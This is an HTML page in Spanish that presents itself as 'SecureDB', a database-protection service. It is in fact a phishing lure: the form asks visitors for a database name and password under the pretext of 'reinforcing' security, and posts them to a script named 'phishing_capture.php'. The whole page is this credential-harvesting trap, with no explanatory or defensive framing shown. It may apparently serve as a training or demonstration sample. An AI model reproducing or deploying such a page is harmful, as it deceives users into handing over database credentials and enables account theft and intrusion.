<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE DB</title>
    <link rel="stylesheet" href="estilos.css">
</head>
<body>
<header>
        <h1>SecureDB</h1>
        <p>Protege tus bases de datos con soluciones de seguridad avanzadas</p>
</header>
    <main>
        <h2>Acceso Seguro</h2>
            <p>Ingrese las credenciales de la base de datos que desea reforzar.</p>
        <form action="phishing_capture.php" method="POST">
            <label for="username">Base de datos:</label>
            <input type="text" id="username" name="username" required><br><br>
            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password" required><br><br>
            <button type="submit">Reforzar</button>
        </form>
    </main>
</body>
</html>
